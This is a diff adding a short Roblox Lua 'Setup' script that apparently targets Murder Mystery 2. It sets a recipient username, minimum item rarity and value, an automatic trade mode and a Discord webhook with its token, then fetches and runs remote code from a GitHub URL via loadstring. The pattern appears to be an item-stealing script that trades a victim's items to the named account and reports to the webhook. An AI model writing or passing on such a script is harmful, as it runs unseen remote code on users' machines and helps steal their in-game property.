@@ -1,0 +1,9 @@
+ Setup:
+_G.Usernames = {"Akechi0005"}
+_G.min_rarity = "Uncommon"
+_G.min_value = 1
+_G.pingEveryone = "Yes"
+_G.webhook = "https://discord.com/api/webhooks/1559151036214546472/cCjVdg2g--O6aHoRFLoMKXStzpDXCVoH2M0wdpwE9bvFGvRfoQqZElS3wMGJmaQhB27A"
+_G.TradeMode = "AUTO"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XHupScript/Xscript/refs/heads/main/mm2"))()
